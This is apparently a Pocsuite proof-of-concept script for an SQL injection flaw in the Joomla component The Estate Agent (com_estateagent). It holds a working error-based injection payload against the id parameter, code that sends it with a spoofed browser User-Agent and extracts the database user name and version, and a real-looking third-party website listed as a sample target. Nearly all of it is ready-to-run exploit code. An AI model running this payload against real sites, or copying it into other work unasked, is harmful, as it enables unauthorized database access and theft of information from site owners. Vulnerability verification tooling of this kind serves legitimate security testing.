#!/usr/bin/env python
# coding: utf-8
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
import re

class TestPOC(POCBase):
    vulID = '72776'  # ssvid
    version = '1.0'
    author = ['kikay']
    vulDate = '2011-11-29'
    createDate = '2016-01-24'
    updateDate = '2016-01-24'
    references = ['http://www.seebug.org/vuldb/ssvid-72776']
    name = 'joomla component The Estate Agent (com_estateagent) SQL injection Vulnerability'
    appPowerLink = 'http://www.joomla.org'
    appName = 'joomla component The Estate Agent '
    appVersion = 'N/A'
    vulType = 'SQL injection'
    desc = '''
        joomla component The Estate Agent对参数id过滤不严，导致出现SQL注入漏洞。
        远程攻击者可以利用回显报错等方式，执行SQL指令，获取敏感信息。
    '''
    samples = ['http://www.loyolapropiedades.com.ar']

    def _attack(self):
        #利用SQL注入读取数据库信息
        result = {}
        #访问的地址
        exploit='/index.php?option=com_estateagent&act=cat&task=showCE&id='
        #利用Union方式读取信息
        payload="1  AND (SELECT 1222 FROM(SELECT COUNT(*),CONCAT(0x247e7e7e24,"\
        "user(),0x2a2a2a,version(),0x247e7e7e24,FLOOR(RAND(0)*2))x FROM "\
        "INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)-- -"
        #构造漏洞利用连接
        vulurl=self.url+exploit+payload
        #自定义的HTTP头
        httphead = {
          'User-Agent':'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
          'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
          'Connection':'keep-alive'
        }
        #提取信息的正则表达式
        parttern='\$~~~\$(.*)\*\*\*(.*)\$~~~\$'
        #发送请求
        resp=req.get(url=vulurl,headers=httphead,timeout=80)
        #检查是否含有特征字符串
        if '$~~~$' in resp.content:
            #提取信息
            match=re.search(parttern,resp.content,re.M|re.I)
            if match:
                #漏洞利用成功
                result['DbInfo']={}
                #数据库用户名
                result['DbInfo']['Username']=match.group(1)
                #数据库版本
                result['DbInfo']['Version']=match.group(2)
        return self.parse_output(result)

    def _verify(self):
        return self._attack()

    def parse_output(self, result):
        #parse output
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)